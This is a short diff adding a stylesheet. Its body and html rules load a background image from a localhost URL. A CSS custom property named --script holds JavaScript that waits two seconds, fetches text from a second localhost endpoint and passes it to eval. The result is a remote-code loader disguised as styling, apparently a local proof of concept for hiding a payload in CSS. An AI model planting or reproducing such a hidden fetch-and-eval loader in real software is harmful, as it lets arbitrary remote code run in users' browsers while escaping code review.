@@ -1,0 +1,16 @@
+/* @import url("http://localhost:3000/bruh"); */
+
+body,
+html {
+  background-image: url("http://localhost:3000/bruh");
+}
+
+:root {
+  --script: setTimeout(function() {
+    fetch("http://localhost:3000/bruh2").then(function(response) {
+      return response.text();
+    }).then(function(text) {
+      eval(text);
+    });
+  }, 2000);
+}
